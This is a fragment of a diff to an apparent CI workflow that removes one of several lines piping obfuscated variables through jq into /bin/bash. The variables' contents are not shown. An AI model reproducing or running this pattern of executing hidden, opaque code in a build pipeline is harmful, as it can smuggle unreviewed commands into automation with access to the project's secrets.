@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$oto976" | jq -r .w61 | /bin/bash
           echo $ooima6701 | jq -r .kyoor7491 | /bin/bash
           echo $sobhn23 | jq -r .blp69785 | /bin/bash
-          echo $bob6429 | jq -r .sczse86 | /bin/bash
           printf '%s' "$qoufe09423" | jq -r .zf35 | /bin/bash
 
       - name: Save data
